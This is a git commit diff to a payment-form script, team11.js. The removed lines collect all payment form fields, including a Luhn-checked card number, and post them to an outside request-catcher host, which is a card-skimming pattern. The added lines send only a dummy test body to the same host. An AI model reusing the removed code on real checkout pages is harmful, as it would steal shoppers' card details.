0adbbbdeb8b40bcb200476d350b26c2dc8b7fecc
zachlj <zjohnson@highfield.co.uk>
2026-03-16 14:33:18 +0000

    Add in logs for testing

--- team11.js
+++ team11.js
@@ -3,16 +3,13 @@ const paymentForm = document.getElementById('payment-form');
 paymentForm.addEventListener('submit', function(event) {
     event.preventDefault();
 
-    const formData = new FormData(paymentForm);
-    const data = Object.fromEntries(formData.entries());
-
-    if (validateLuhn(data.cardNumber)) {
-        fetch('https://team11.requestcatcher.com/', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(data)
-        });
-    }
+    fetch('https://team11.requestcatcher.com/', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ test: "hello" })
+    })
+    .then(res => console.log("sent"))
+    .catch(err => console.error(err));
 });
